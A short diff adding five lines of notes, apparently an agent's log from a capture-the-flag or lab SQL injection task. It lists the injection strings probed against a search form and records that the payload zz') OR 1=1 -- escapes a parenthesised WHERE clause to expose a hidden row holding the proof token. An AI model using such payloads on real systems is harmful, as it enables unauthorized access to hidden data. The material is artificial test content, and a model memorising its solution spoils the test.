@@ -1,0 +1,5 @@
+- live target (contract.targets[].url), reachable directly (no hb exec). GET / -> form action=/lookup name=q (GET).
+- q=' / "x' OR '1'='1" / "%' OR 1=1 --" / UNION SELECT 1..5 -> "Nothing matched" (errors swallowed).
+- q="%' OR '1'='1" -> 3 public rows only. WHERE wraps input in parentheses + a visibility AND.
+- q="zz') OR 1=1 --" -> + hidden row pill 'restricted' "Private escalation" body proof_<32hex> => answer = proof_... token.
+- GM already CORRECT (parallel worker 13:03:28); target then returns HTTP 410 {"state":"completed"}.
